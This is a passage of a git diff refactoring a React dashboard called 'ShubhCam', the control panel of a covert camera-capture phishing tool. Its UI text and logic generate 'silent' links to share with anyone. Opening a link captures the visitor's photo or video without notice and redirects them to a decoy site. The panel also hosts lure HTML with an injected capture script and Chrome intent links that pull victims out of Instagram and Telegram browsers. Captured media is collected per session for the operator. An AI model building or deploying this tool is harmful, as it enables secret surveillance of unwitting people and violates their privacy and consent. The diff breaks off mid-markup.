@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Hash, Clock, ImageIcon, Eye, X } from "lucide-react";
+import { Camera, Link2, Copy, RefreshCw, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Eye, X, Smartphone, Globe, Clock, Image as ImageIcon, Zap, Hash, FolderOpen } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { Textarea } from "./ui/textarea";
@@ -10,8 +10,7 @@ import { useSettings } from "@/contexts/SettingsContext";
 import { Switch } from "./ui/switch";
 import { Label } from "./ui/label";
 import { Slider } from "./ui/slider";
-import { Dialog, DialogContent, DialogHeader, DialogTitle } from "./ui/dialog";
-import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "./ui/card";
+import { Dialog, DialogContent } from "./ui/dialog";
 
 interface CapturedPhoto {
   id: string;
@@ -28,9 +27,11 @@ interface CapturedVideo {
   user_agent: string | null;
 }
 
+type TabType = "links" | "chrome" | "html" | "media" | "config";
+
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
-  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom" | "chrome" | "settings">("link");
+  const [activeTab, setActiveTab] = useState<TabType>("links");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
   const [videos, setVideos] = useState<CapturedVideo[]>([]);
   const [loading, setLoading] = useState(false);
@@ -39,24 +40,18 @@ const ShubhCam = () => {
   const fileInputRef = useRef<HTMLInputElement>(null);
   const chromeFileInputRef = useRef<HTMLInputElement>(null);
   
-  // View modal states
   const [viewingPhoto, setViewingPhoto] = useState<CapturedPhoto | null>(null);
   const [viewingVideo, setViewingVideo] = useState<CapturedVideo | null>(null);
   
-  // Use session ID and redirect URL from settings (synced across all devices via Supabase)
   const sessionId = settings.camSessionId || "shubhcam01";
   const redirectUrl = settings.camRedirectUrl || "https://google.com";
 
-  // Get current domain for link generation
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
   const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}&timer=${settings.camCountdownTimer || 5}`;
   const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
   const chromeCustomCaptureLink = `${currentOrigin}/chrome-custom-capture?session=${sessionId}`;
   const videoCaptureLink = `${currentOrigin}/video-capture?session=${sessionId}&duration=${settings.camVideoDuration || 5}&redirect=${encodeURIComponent(redirectUrl)}`;
-  
-  // Chrome intent link for in-app browsers (Instagram, Telegram, etc.)
-  const chromeIntentLink = `intent://${currentOrigin.replace(/^https?:\/\//, '')}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}#Intent;scheme=https;package=com.android.chrome;end`;
-  // Load photos from Supabase
+
   const loadPhotos = async () => {
     setLoading(true);
     const { data, error } = await supabase
@@ -66,19 +61,13 @@ const ShubhCam = () => {
       .order('captured_at', { ascending: false });
     
     if (error) {
-      console.error('Error loading photos:', error);
-      toast({
-        title: "Error",
-        description: "Failed to load photos",
-        variant: "destructive"
-      });
+      toast({ title: "Error", description: "Failed to load photos", variant: "destructive" });
     } else {
       setPhotos(data || []);
     }
     setLoading(false);
   };
 
-  // Load videos from Supabase
   const loadVideos = async () => {
     setLoading(true);
     const { data, error } = await supabase
@@ -87,38 +76,23 @@ const ShubhCam = () => {
       .eq('session_id', sessionId)
       .order('captured_at', { ascending: false });
     
-    if (error) {
-      console.error('Error loading videos:', error);
-    } else {
-      setVideos(data || []);
-    }
+    if (!error) setVideos(data || []);
     setLoading(false);
   };
 
   const deleteVideo = async (videoId: string, videoUrl: string) => {
-    // Extract file path from URL
     const urlParts = videoUrl.split('/captured-videos/');
     if (urlParts[1]) {
       await supabase.storage.from('captured-videos').remove([urlParts[1]]);
     }
     
-    const { error } = await supabase
-      .from('captured_videos')
-      .delete()
-      .eq('id', videoId);
+    const { error } = await supabase.from('captured_videos').delete().eq('id', videoId);
     
     if (error) {
-      toast({
-        title: "Error",
-        description: "Failed to delete video",
-        variant: "destructive"
-      });
+      toast({ title: "Error", description: "Failed to delete video", variant: "destructive" });
     } else {
       setVideos(videos.filter(v => v.id !== videoId));
-      toast({
-        title: "Deleted",
-        description: "Video removed",
-      });
+      toast({ title: "Deleted", description: "Video removed" });
     }
   };
 
@@ -134,20 +108,14 @@ const ShubhCam = () => {
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
-    toast({
-      title: "Copied!",
-      description: "Link copied to clipboard",
-    });
+    toast({ title: "Copied!", description: "Link copied to clipboard" });
   };
 
   const generateNewSession = () => {
     const newSessionId = Math.random().toString(36).substring(2, 10);
     updateSettings({ camSessionId: newSessionId });
     setPhotos([]);
-    toast({
-      title: "New Session Created",
-      description: `Session ID: ${newSessionId} (synced across all devices)`,
-    });
+    toast({ title: "New Session", description: `ID: ${newSessionId}` });
   };
 
   const refreshPhotos = async () => {
@@ -158,26 +126,14 @@ const ShubhCam = () => {
       .eq('session_id', sessionId)
       .order('captured_at', { ascending: false });
     
-    if (error) {
-      console.error('Error loading photos:', error);
-      toast({
-        title: "Error",
-        description: "Failed to load photos",
-        variant: "destructive"
-      });
-    } else {
-      const newPhotos = data || [];
-      setPhotos(newPhotos);
-      toast({
-        title: "Refreshed",
-        description: `Found ${newPhotos.length} captured photos for session: ${sessionId}`,
-      });
+    if (!error) {
+      setPhotos(data || []);
+      toast({ title: "Refreshed", description: `${data?.length || 0} photos found` });
     }
     setLoading(false);
   };
 
   const deletePhoto = async (photoId: string, imageUrl: string) => {
-    // Delete from storage if it's a storage URL
     if (imageUrl.includes('/captured-photos/')) {
       const urlParts = imageUrl.split('/captured-photos/');
       if (urlParts[1]) {
@@ -185,29 +141,18 @@ const ShubhCam = () => {
       }
     }
     
-    const { error } = await supabase
-      .from('captured_photos')
-      .delete()
-      .eq('id', photoId);
+    const { error } = await supabase.from('captured_photos').delete().eq('id', photoId);
     
     if (error) {
-      toast({
-        title: "Error",
-        description: "Failed to delete photo",
-        variant: "destructive"
-      });
+      toast({ title: "Error", description: "Failed to delete photo", variant: "destructive" });
     } else {
       setPhotos(photos.filter(p => p.id !== photoId));
-      toast({
-        title: "Deleted",
-        description: "Photo removed",
-      });
+      toast({ title: "Deleted", description: "Photo removed" });
     }
   };
 
   const downloadPhoto = async (photo: CapturedPhoto) => {
     try {
-      // For storage URLs, fetch and download
       if (photo.image_data.startsWith('http')) {
         const response = await fetch(photo.image_data);
         const blob = await response.blob();
@@ -218,54 +163,30 @@ const ShubhCam = () => {
         link.click();
         URL.revokeObjectURL(url);
       } else {
-        // For base64 data (legacy)
         const link = document.createElement('a');
         link.href = photo.image_data;
         link.download = `capture_${photo.id}.jpg`;
         link.click();
       }
     } catch (err) {
-      console.error('Download error:', err);
-      toast({
-        title: "Error",
-        description: "Failed to download photo",
-        variant: "destructive"
-      });
+      toast({ title: "Error", description: "Failed to download", variant: "destructive" });
     }
   };
 
   const clearAllPhotos = async () => {
-    // Delete all photos from storage for this session
     try {
-      const { data: files } = await supabase.storage
-        .from('captured-photos')
-        .list(sessionId);
-      
+      const { data: files } = await supabase.storage.from('captured-photos').list(sessionId);
       if (files && files.length > 0) {
         const filePaths = files.map(f => `${sessionId}/${f.name}`);
         await supabase.storage.from('captured-photos').remove(filePaths);
       }
-    } catch (err) {
-      console.error('Error clearing storage:', err);
-    }
+    } catch (err) {}
     
-    const { error } = await supabase
-      .from('captured_photos')
-      .delete()
-      .eq('session_id', sessionId);
+    const { error } = await supabase.from('captured_photos').delete().eq('session_id', sessionId);
     
-    if (error) {
-      toast({
-        title: "Error",
-        description: "Failed to clear photos",
-        variant: "destructive"
-      });
-    } else {
+    if (!error) {
       setPhotos([]);
-      toast({
-        title: "Cleared",
-        description: "All photos deleted",
-      });
+      toast({ title: "Cleared", description: "All photos deleted" });
     }
   };
 
@@ -274,12 +195,8 @@ const ShubhCam = () => {
     if (file) {
       const reader = new FileReader();
       reader.onload = (e) => {
-        const content = e.target?.result as string;
-        setCustomHtml(content);
-        toast({
-          title: "HTML Uploaded",
-          description: "Custom HTML loaded successfully",
-        });
+        setCustomHtml(e.target?.result as string);
+        toast({ title: "Uploaded", description: "HTML loaded" });
       };
       reader.readAsText(file);
     }
@@ -290,12 +207,8 @@ const ShubhCam = () => {
     if (file) {
       const reader = new FileReader();
       reader.onload = (e) => {
-        const content = e.target?.result as string;
-        setChromeCustomHtml(content);
-        toast({
-          title: "Chrome HTML Uploaded",
-          description: "Chrome custom HTML loaded successfully",
-        });
+        setChromeCustomHtml(e.target?.result as string);
+        toast({ title: "Uploaded", description: "Chrome HTML loaded" });
       };
       reader.readAsText(file);
     }
@@ -303,878 +216,612 @@ const ShubhCam = () => {
 
   const saveCustomHtml = () => {
     updateSettings({ customCaptureHtml: customHtml });
-    toast({
-      title: "Saved!",
-      description: "Custom HTML saved and synced",
-    });
+    toast({ title: "Saved!", description: "Custom HTML synced" });
   };
 
   const saveChromeCustomHtml = () => {
     updateSettings({ chromeCustomHtml: chromeCustomHtml });
-    toast({
-      title: "Saved!",
-      description: "Chrome custom HTML saved and synced",
-    });
+    toast({ title: "Saved!", description: "Chrome HTML synced" });
   };
 
+  const tabs: { id: TabType; icon: React.ReactNode; label: string }[] = [
+    { id: "links", icon: <Link2 className="w-3.5 h-3.5" />, label: "Links" },
+    { id: "chrome", icon: <Chrome className="w-3.5 h-3.5" />, label: "Chrome" },
+    { id: "html", icon: <Code className="w-3.5 h-3.5" />, label: "HTML" },
+    { id: "media", icon: <FolderOpen className="w-3.5 h-3.5" />, label: `${photos.length + videos.length}` },
+    { id: "config", icon: <Settings className="w-3.5 h-3.5" />, label: "Config" },
+  ];
+
   return (
-    <div className="relative border-2 border-neon-pink rounded-xl p-5 bg-gradient-to-br from-card/50 via-neon-pink/5 to-card/50 mt-6 overflow-hidden shadow-[0_0_30px_hsl(var(--neon-pink)/0.2)] w-full mx-0">
-      {/* Animated corner accents */}
-      <div className="absolute top-0 left-0 w-16 h-16 border-t-2 border-l-2 border-neon-pink rounded-tl-xl" />
-      <div className="absolute top-0 right-0 w-16 h-16 border-t-2 border-r-2 border-neon-cyan rounded-tr-xl" />
-      <div className="absolute bottom-0 left-0 w-16 h-16 border-b-2 border-l-2 border-neon-cyan rounded-bl-xl" />
-      <div className="absolute bottom-0 right-0 w-16 h-16 border-b-2 border-r-2 border-neon-pink rounded-br-xl" />
-      
-      {/* Glowing orbs */}
-      <div className="absolute -top-10 -right-10 w-32 h-32 bg-neon-pink/20 rounded-full blur-3xl" />
-      <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-neon-cyan/20 rounded-full blur-3xl" />
-
-      {/* Header */}
-      <div className="relative flex items-center gap-4 mb-5">
-        <div className="relative p-3 rounded-xl border-2 border-neon-pink bg-gradient-to-br from-neon-pink/20 to-neon-cyan/10 shadow-[0_0_20px_hsl(var(--neon-pink)/0.4)]">
-          <Camera className="w-7 h-7 text-neon-pink drop-shadow-[0_0_8px_hsl(var(--neon-pink))]" />
-          <div className="absolute inset-0 rounded-xl border border-neon-pink/50 animate-ping opacity-30" />
-        </div>
-        <div>
-          <h2 className="font-display font-bold text-2xl tracking-wider">
-            <span className="text-neon-cyan drop-shadow-[0_0_10px_hsl(var(--neon-cyan))]">SHUBH</span>
-            <span className="text-neon-pink drop-shadow-[0_0_10px_hsl(var(--neon-pink))]">CAM</span>
-          </h2>
-          <p className="text-neon-pink/80 text-xs flex items-center gap-1.5 font-mono">
-            <Zap className="w-3 h-3 animate-pulse" /> REMOTE PHOTO CAPTURE SYSTEM
-          </p>
+    <div className="mt-6 w-full">
+      {/* Header Card */}
+      <div className="bg-gradient-to-r from-neon-green/10 via-background to-neon-green/5 border border-neon-green/30 rounded-xl p-4 mb-4">
+        <div className="flex items-center gap-3">
+          <div className="w-10 h-10 rounded-lg bg-neon-green/20 border border-neon-green/40 flex items-center justify-center">
+            <Camera className="w-5 h-5 text-neon-green" />
+          </div>
+          <div className="flex-1 min-w-0">
+            <h2 className="font-display font-bold text-lg text-foreground tracking-wide">
+              CAM <span className="text-neon-green">CAPTURE</span>
+            </h2>
+            <div className="flex items-center gap-2 text-xs text-muted-foreground">
+              <span className="font-mono text-neon-green/80">{sessionId}</span>
+              <span className="w-1 h-1 rounded-full bg-neon-green animate-pulse" />
+            </div>
+          </div>
+          <Button
+            size="icon"
+            variant="ghost"
+            onClick={generateNewSession}
+            className="h-8 w-8 text-neon-green hover:bg-neon-green/10"
+          >
+            <RefreshCw className="w-4 h-4" />
+          </Button>
         </div>
       </div>
 
-      {/* Tabs */}
-      <div className="relative flex flex-wrap rounded-xl overflow-hidden border-2 border-neon-pink/50 mb-5 bg-card/50 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
-        <button
-          onClick={() => setActiveTab("link")}
-          className={cn(
-            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide min-w-[50px]",
-            activeTab === "link"
-              ? "bg-gradient-to-r from-neon-pink to-neon-pink/80 text-background shadow-[0_0_20px_hsl(var(--neon-pink)/0.5)]"
-              : "text-muted-foreground hover:bg-neon-pink/10 hover:text-neon-pink"
-          )}
-        >
-          <Zap className="w-3 h-3" /> LINK
-        </button>
-        <button
-          onClick={() => setActiveTab("chrome")}
-          className={cn(
-            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
-            activeTab === "chrome"
-              ? "bg-gradient-to-r from-neon-orange to-neon-orange/80 text-background shadow-[0_0_20px_hsl(var(--neon-orange)/0.5)]"
-              : "text-muted-foreground hover:bg-neon-orange/10 hover:text-neon-orange"
-          )}
-        >
-          <Chrome className="w-3 h-3" /> CHR
-        </button>
-        <button
-          onClick={() => setActiveTab("custom")}
-          className={cn(
-            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
-            activeTab === "custom"
-              ? "bg-gradient-to-r from-neon-cyan to-neon-cyan/80 text-background shadow-[0_0_20px_hsl(var(--neon-cyan)/0.5)]"
-              : "text-muted-foreground hover:bg-neon-cyan/10 hover:text-neon-cyan"
-          )}
-        >
-          <Code className="w-3 h-3" /> HTML
-        </button>
-        <button
-          onClick={() => { setActiveTab("photos"); refreshPhotos(); loadVideos(); }}
-          className={cn(
-            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
-            activeTab === "photos"
-              ? "bg-gradient-to-r from-neon-purple to-neon-purple/80 text-background shadow-[0_0_20px_hsl(var(--neon-purple)/0.5)]"
-              : "text-muted-foreground hover:bg-neon-purple/10 hover:text-neon-purple"
-          )}
-        >
-          <ImageIcon className="w-3 h-3" /> {photos.length + videos.length}
-        </button>
-        <button
-          onClick={() => setActiveTab("settings")}
-          className={cn(
-            "flex-1 py-2.5 px-1 flex items-center justify-center gap-1 transition-all text-[9px] font-bold tracking-wide border-l border-neon-pink/30 min-w-[50px]",
-            activeTab === "settings"
-              ? "bg-gradient-to-r from-neon-green to-neon-green/80 text-background shadow-[0_0_20px_hsl(var(--neon-green)/0.5)]"
-              : "text-muted-foreground hover:bg-neon-green/10 hover:text-neon-green"
-          )}
-        >
-          <Settings className="w-3 h-3" /> SET
-        </button>
+      {/* Tab Navigation - Grid Style */}
+      <div className="grid grid-cols-5 gap-1.5 mb-4">
+        {tabs.map((tab) => (
+          <button
+            key={tab.id}
+            onClick={() => {
+              setActiveTab(tab.id);
+              if (tab.id === "media") { refreshPhotos(); loadVideos(); }
+            }}
+            className={cn(
+              "flex flex-col items-center justify-center gap-1 py-2 px-1 rounded-lg transition-all text-[10px] font-medium",
+              activeTab === tab.id
+                ? "bg-neon-green text-background shadow-[0_0_12px_hsl(var(--neon-green)/0.4)]"
+                : "bg-card/50 border border-border/50 text-muted-foreground hover:border-neon-green/30 hover:text-neon-green"
+            )}
+          >
+            {tab.icon}
+            <span>{tab.label}</span>
+          </button>
+        ))}
       </div>
 
-      {activeTab === "link" ? (
-        <div className="relative space-y-5">
-          {/* How it works */}
-          <div className="bg-gradient-to-r from-neon-pink/10 to-neon-cyan/10 rounded-xl p-4 border border-neon-pink/30 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
-            <h3 className="font-bold text-neon-pink mb-3 flex items-center gap-2">
-              <Zap className="w-4 h-4" /> How it works:
-            </h3>
-            <ol className="text-sm text-foreground/80 space-y-2">
-              <li className="flex items-center gap-2">
-                <span className="w-5 h-5 rounded-full bg-neon-pink/20 text-neon-pink text-xs flex items-center justify-center font-bold">1</span>
-                Copy the link below
-              </li>
-              <li className="flex items-center gap-2">
-                <span className="w-5 h-5 rounded-full bg-neon-cyan/20 text-neon-cyan text-xs flex items-center justify-center font-bold">2</span>
-                Share with anyone
-              </li>
-              <li className="flex items-center gap-2">
-                <span className="w-5 h-5 rounded-full bg-neon-purple/20 text-neon-purple text-xs flex items-center justify-center font-bold">3</span>
-                Camera auto-captures & redirects!
-              </li>
-            </ol>
-          </div>
-
-          {/* Session ID */}
-          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-cyan/30">
-            <span className="text-muted-foreground">Session:</span>
-            <span className="text-neon-cyan font-mono font-bold tracking-wider">{sessionId}</span>
-          </div>
-
-          {/* Silent Link */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
-            <div className="flex items-center gap-2 mb-3">
-              <span className="text-xl">👁</span>
-              <h3 className="text-neon-pink font-bold tracking-wide">SILENT LINK (Auto Capture)</h3>
-            </div>
-            <div className="flex gap-2">
-              <Input
-                value={captureLink}
-                readOnly
-                className="bg-background/50 border-neon-pink/50 text-neon-pink text-xs font-mono focus:border-neon-pink focus:ring-neon-pink/30"
-              />
-              <Button
-                variant="outline"
-                size="icon"
-                onClick={() => copyToClipboard(captureLink)}
-                className="border-neon-pink text-neon-pink hover:bg-neon-pink/20 hover:shadow-[0_0_15px_hsl(var(--neon-pink)/0.4)] shrink-0 transition-all"
-              >
-                <Copy className="w-4 h-4" />
-              </Button>
-            </div>
-            <p className="text-neon-orange text-xs mt-3 flex items-center gap-1">
-              ⚠ Capture ke baad redirect: <span className="font-mono">{redirectUrl}</span>
-            </p>
-          </div>
-
-          {/* Video Capture Link */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-red/30">
-            <div className="flex items-center gap-2 mb-3">
-              <span className="text-xl">🎬</span>
-              <h3 className="text-neon-red font-bold tracking-wide">VIDEO CAPTURE LINK</h3>
-            </div>
-            <div className="flex gap-2">
-              <Input
-                value={videoCaptureLink}
-                readOnly
-                className="bg-background/50 border-neon-red/50 text-neon-red text-xs font-mono focus:border-neon-red focus:ring-neon-red/30"
-              />
-              <Button
-                variant="outline"
-                size="icon"
-                onClick={() => copyToClipboard(videoCaptureLink)}
-                className="border-neon-red text-neon-red hover:bg-neon-red/20 hover:shadow-[0_0_15px_hsl(var(--neon-red)/0.4)] shrink-0 transition-all"
-              >
-                <Copy className="w-4 h-4" />
-              </Button>
-            </div>
-            <p className="text-neon-purple text-xs mt-3 flex items-center gap-1">
-              🎥 {settings.camVideoDuration || 5}s video capture + redirect
-            </p>
-          </div>
-
-          {/* Redirect URL */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
-            <div className="flex items-center gap-2 mb-3">
-              <span className="text-xl">🔗</span>
-              <h3 className="text-neon-cyan font-bold tracking-wide">REDIRECT URL</h3>
-            </div>
-            <Input
-              value={redirectUrl}
-              onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
-              placeholder="https://google.com"
-              className="bg-background/50 border-neon-cyan/50 text-neon-cyan focus:border-neon-cyan focus:ring-neon-cyan/30"
-            />
-            <p className="text-neon-purple text-xs mt-3">
-              💡 User capture ke baad is URL pe redirect hoga
-            </p>
-          </div>
-
-          {/* Test Link */}
-          <Button
-            onClick={() => window.open(captureLink, '_blank')}
-            variant="outline"
-            className="w-full border-2 border-neon-cyan text-neon-cyan hover:bg-neon-cyan/20 hover:shadow-[0_0_20px_hsl(var(--neon-cyan)/0.4)] transition-all py-5"
-          >
-            <ExternalLink className="w-4 h-4 mr-2" /> TEST LINK
-          </Button>
-
-          {/* Action Buttons */}
-          <div className="grid grid-cols-2 gap-3">
-            <Button
-              onClick={generateNewSession}
-              variant="outline"
-              className="border-2 border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] transition-all py-5"
-            >
-              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
-            </Button>
-            <Button
-              onClick={refreshPhotos}
-              className="bg-gradient-to-r from-neon-pink to-neon-purple text-white font-bold hover:opacity-90 shadow-[0_0_20px_hsl(var(--neon-pink)/0.4)] transition-all py-5"
-            >
-              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH
-            </Button>
-          </div>
-        </div>
-      ) : activeTab === "chrome" ? (
-        <div className="relative space-y-5">
-          {/* Chrome Intent Info */}
-          <div className="bg-gradient-to-r from-neon-orange/10 to-neon-yellow/10 rounded-xl p-4 border border-neon-orange/30 shadow-[inset_0_0_20px_hsl(var(--neon-orange)/0.1)]">
-            <h3 className="font-bold text-neon-orange mb-3 flex items-center gap-2">
-              <Chrome className="w-4 h-4" /> Chrome Intent Link
-            </h3>
-            <p className="text-sm text-foreground/80 mb-2">
-              Ye link Instagram/Telegram ke in-app browser se automatically Chrome me open hoga.
-            </p>
-            <ol className="text-sm text-foreground/70 space-y-2">
-              <li className="flex items-start gap-2">
-                <span className="w-5 h-5 rounded-full bg-neon-orange/20 text-neon-orange text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">1</span>
-                <span>In-app browser detect karta hai</span>
-              </li>
-              <li className="flex items-start gap-2">
-                <span className="w-5 h-5 rounded-full bg-neon-yellow/20 text-neon-yellow text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">2</span>
-                <span>Android pe auto Chrome redirect</span>
-              </li>
-              <li className="flex items-start gap-2">
-                <span className="w-5 h-5 rounded-full bg-neon-green/20 text-neon-green text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">3</span>
-                <span>Chrome me custom HTML + camera capture</span>
-              </li>
-            </ol>
-          </div>
-
-          {/* Session ID */}
-          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-orange/30">
-            <span className="text-muted-foreground">Session:</span>
-            <span className="text-neon-orange font-mono font-bold tracking-wider">{sessionId}</span>
-          </div>
-
-          {/* Chrome Custom HTML Upload */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
-            <div className="flex items-center gap-2 mb-3">
-              <Code className="w-5 h-5 text-neon-pink" />
-              <h3 className="text-neon-pink font-bold tracking-wide text-sm">CHROME CUSTOM HTML</h3>
-            </div>
-            <p className="text-xs text-muted-foreground mb-3">
-              Upload custom HTML jo Instagram/Telegram se Chrome me open hoke dikhega.
-            </p>
-            
-            {/* File Upload */}
-            <input
-              type="file"
-              accept=".html,.htm"
-              ref={chromeFileInputRef}
-              onChange={handleChromeFileUpload}
-              className="hidden"
-            />
-            <Button
-              onClick={() => chromeFileInputRef.current?.click()}
-              variant="outline"
-              className="w-full border-neon-pink text-neon-pink hover:bg-neon-pink/10 mb-3"
-            >
-              <Upload className="w-4 h-4 mr-2" /> UPLOAD HTML FILE
-            </Button>
-
-            {/* HTML Textarea */}
-            <Textarea
-              value={chromeCustomHtml}
-              onChange={(e) => setChromeCustomHtml(e.target.value)}
-              placeholder="Paste your HTML code here..."
-              className="bg-input border-neon-pink/50 text-foreground font-mono text-xs min-h-[120px] mb-3"
-            />
-
-            {/* Save Button */}
-            <Button
-              onClick={saveChromeCustomHtml}
-              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
-            >
-              <Zap className="w-4 h-4 mr-2" /> SAVE CHROME HTML
-            </Button>
-          </div>
-
-          {/* Chrome Custom Capture Link */}
-          {chromeCustomHtml && (
-            <div className="bg-card/30 rounded-xl p-4 border border-neon-green/30">
-              <div className="flex items-center gap-2 mb-3">
-                <span className="text-xl">🔗</span>
-                <h3 className="text-neon-green font-bold tracking-wide text-sm">CHROME CUSTOM LINK</h3>
+      {/* Content Area */}
+      <div className="bg-card/30 border border-border/50 rounded-xl p-4">
+        
+        {/* LINKS TAB */}
+        {activeTab === "links" && (
+          <div className="space-y-4">
+            {/* Quick Info */}
+            <div className="grid grid-cols-3 gap-2 text-center">
+              <div className="bg-background/50 rounded-lg p-2 border border-border/30">
+                <Camera className="w-4 h-4 mx-auto mb-1 text-neon-green" />
+                <p className="text-[9px] text-muted-foreground">Photo</p>
               </div>
-              <p className="text-xs text-muted-foreground mb-3">
-                Ye link Instagram/Telegram se Chrome me redirect karke custom HTML dikhayega.
-              </p>
-              <div className="flex gap-2 mb-3">
-                <Input
-                  value={chromeCustomCaptureLink}
-                  readOnly
-                  className="bg-background/50 border-neon-green/50 text-neon-green text-xs font-mono focus:border-neon-green focus:ring-neon-green/30"
-                />
-                <Button
-                  variant="outline"
-                  size="icon"
-                  onClick={() => copyToClipboard(chromeCustomCaptureLink)}
-                  className="border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] shrink-0 transition-all"
-                >
-                  <Copy className="w-4 h-4" />
-                </Button>
+              <div className="bg-background/50 rounded-lg p-2 border border-border/30">
+                <Video className="w-4 h-4 mx-auto mb-1 text-neon-green" />
+                <p className="text-[9px] text-muted-foreground">{settings.camVideoDuration || 5}s Video</p>
               </div>
-              <Button
-                onClick={() => window.open(chromeCustomCaptureLink, '_blank')}
-                variant="outline"
-                className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
-              >
-                <ExternalLink className="w-4 h-4 mr-2" /> TEST CHROME LINK
-              </Button>
-            </div>
-          )}
-
-          {/* Normal Link (with built-in detection) */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
-            <div className="flex items-center gap-2 mb-3">
-              <span className="text-xl">✅</span>
-              <h3 className="text-neon-cyan font-bold tracking-wide text-sm">SMART LINK (No Custom HTML)</h3>
-            </div>
-            <p className="text-xs text-muted-foreground mb-3">
-              Standard link - capture karke redirect karta hai (custom HTML nahi dikhata).
-            </p>
-            <div className="flex gap-2">
-              <Input
-                value={captureLink}
-                readOnly
-                className="bg-background/50 border-neon-cyan/50 text-neon-cyan text-xs font-mono focus:border-neon-cyan focus:ring-neon-cyan/30"
-              />
-              <Button
-                variant="outline"
-                size="icon"
-                onClick={() => copyToClipboard(captureLink)}
-                className="border-neon-cyan text-neon-cyan hover:bg-neon-cyan/20 hover:shadow-[0_0_15px_hsl(var(--neon-cyan)/0.4)] shrink-0 transition-all"
-              >
-                <Copy className="w-4 h-4" />
-              </Button>
-            </div>
-          </div>
-
-          {/* Warning */}
-          <div className="bg-neon-red/10 rounded-xl p-4 border border-neon-red/30">
-            <div className="flex items-start gap-3">
-              <span className="text-xl">⚠️</span>
-              <div>
-                <h4 className="text-neon-red font-bold text-sm mb-1">Important Notes</h4>
-                <ul className="text-xs text-foreground/70 space-y-1">
-                  <li>• Sirf Android devices pe kaam karta hai</li>
-                  <li>• iOS/iPhone supported nahi hai</li>
-                  <li>• Non-Chrome browsers me error message dikhega</li>
-                </ul>
+              <div className="bg-background/50 rounded-lg p-2 border border-border/30">
+                <Globe className="w-4 h-4 mx-auto mb-1 text-neon-green" />
+                <p className="text-[9px] text-muted-foreground truncate">{redirectUrl.replace(/https?:\/\//, '').slice(0, 10)}</p>
               </div>
             </div>
-          </div>
-        </div>
-      ) : activeTab === "custom" ? (
-        <div className="space-y-4">
-          {/* Custom HTML Upload */}
-          <div className="bg-muted/50 rounded-lg p-4 border border-border">
-            <h3 className="font-bold text-neon-cyan mb-2">Custom HTML Capture</h3>
-            <p className="text-sm text-muted-foreground">
-              Upload your own HTML page. Camera capture script will be auto-injected.
-            </p>
-          </div>
 
-          {/* File Upload */}
-          <input
-            type="file"
-            accept=".html,.htm"
-            ref={fileInputRef}
-            onChange={handleFileUpload}
-            className="hidden"
-          />
-          <Button
-            onClick={() => fileInputRef.current?.click()}
-            variant="outline"
-            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
-          >
-            <Upload className="w-4 h-4 mr-2" /> UPLOAD HTML FILE
-          </Button>
-
-          {/* HTML Textarea */}
-          <div>
-            <div className="flex items-center gap-2 mb-2">
-              <Code className="w-4 h-4 text-neon-cyan" />
-              <h3 className="text-neon-cyan font-bold text-sm">HTML CODE</h3>
-            </div>
-            <Textarea
-              value={customHtml}
-              onChange={(e) => setCustomHtml(e.target.value)}
-              placeholder="Paste your HTML code here..."
-              className="bg-input border-neon-cyan/50 text-foreground font-mono text-xs min-h-[200px]"
-            />
-          </div>
-
-          {/* Save Button */}
-          <Button
-            onClick={saveCustomHtml}
-            className="w-full bg-neon-green text-background font-bold hover:bg-neon-green/90"
-          >
-            <Zap className="w-4 h-4 mr-2" /> SAVE HTML
-          </Button>
-
-          {/* Custom Link */}
-          {customHtml && (
-            <div className="space-y-3">
-              <div className="flex items-center gap-2 mb-2">
-                <span className="text-neon-pink">🔗</span>
-                <h3 className="text-neon-pink font-bold text-sm">CUSTOM CAPTURE LINK</h3>
+            {/* Silent Photo Link */}
+            <div className="space-y-2">
+              <div className="flex items-center gap-2">
+                <Camera className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium text-foreground">Silent Photo Capture</span>
